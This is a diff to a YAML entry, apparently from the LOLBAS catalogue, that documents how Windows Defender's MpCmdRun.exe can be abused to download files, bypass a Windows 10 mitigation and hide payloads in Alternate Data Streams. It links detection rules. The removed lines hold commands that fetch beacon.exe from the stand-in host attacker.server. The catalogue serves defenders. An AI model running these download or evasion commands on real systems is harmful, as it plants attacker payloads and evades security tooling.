@@ -1,26 +1,26 @@
 ---
 Name: MpCmdRun.exe
 Description: Binary part of Windows Defender. Used to manage settings in Windows Defender
-Author: 'Oddvar Moe'
+Author: Oddvar Moe
 Created: 2020-03-20
 Commands:
-  - Command: MpCmdRun.exe -DownloadFile -url https://attacker.server/beacon.exe -path c:\\temp\\beacon.exe
+  - Command: MpCmdRun.exe -DownloadFile -url {REMOTEURL:.exe} -path {PATH_ABSOLUTE:.exe}
     Description: Download file to specified path - Slashes work as well as dashes (/DownloadFile, /url, /path)
     Usecase: Download file
     Category: Download
     Privileges: User
     MitreID: T1105
     OperatingSystem: Windows 10
-  - Command: copy "C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2008.9-0\MpCmdRun.exe" C:\Users\Public\Downloads\MP.exe && chdir "C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2008.9-0\" && "C:\Users\Public\Downloads\MP.exe" -DownloadFile -url https://attacker.server/beacon.exe -path C:\Users\Public\Downloads\evil.exe
+  - Command: copy "C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2008.9-0\MpCmdRun.exe" C:\Users\Public\Downloads\MP.exe && chdir "C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2008.9-0\" && "C:\Users\Public\Downloads\MP.exe" -DownloadFile -url {REMOTEURL:.exe} -path C:\Users\Public\Downloads\evil.exe
     Description: Download file to specified path - Slashes work as well as dashes (/DownloadFile, /url, /path) [updated version to bypass Windows 10 mitigation]
     Usecase: Download file
     Category: Download
     Privileges: User
     MitreID: T1105
     OperatingSystem: Windows 10
-  - Command: MpCmdRun.exe -DownloadFile -url https://attacker.server/beacon.exe -path c:\temp\nicefile.txt:evil.exe
+  - Command: MpCmdRun.exe -DownloadFile -url {REMOTEURL:.exe} -path {PATH_ABSOLUTE:.exe}:evil.exe
     Description: Download file to machine and store it in Alternate Data Stream
-    Usecase: Hide downloaded data inton an Alternate Data Stream
+    Usecase: Hide downloaded data into an Alternate Data Stream
     Category: ADS
     Privileges: User
     MitreID: T1564.004
@@ -29,8 +29,9 @@ Full_Path:
   - Path: C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2008.4-0\MpCmdRun.exe
   - Path: C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2008.7-0\MpCmdRun.exe
   - Path: C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2008.9-0\MpCmdRun.exe
-Code_Sample:
-  - Code:
+  - Path: C:\Program Files\Windows Defender\MpCmdRun.exe
+  - Path: C:\Program Files (x86)\Windows Defender\MpCmdRun.exe
+  - Path: C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.23110.3-0\X86\MpCmdRun.exe
 Detection:
   - Sigma: https://github.com/SigmaHQ/sigma/blob/159bf4bbc103cc2be3fef4b7c2e7c8b23b63fd10/rules/windows/process_creation/win_susp_mpcmdrun_download.yml
   - Elastic: https://github.com/elastic/detection-rules/blob/6ef5c53b0c15e344f0f2d1649941391aea6fa253/rules/windows/command_and_control_remote_file_copy_mpcmdrun.toml
@@ -50,6 +51,5 @@ Acknowledgement:
   - Person: Oddvar Moe
     Handle: '@oddvarmoe'
   - Person: RichRumble
-    Handle: ''
   - Person: Cedric
     Handle: '@th3c3dr1c'
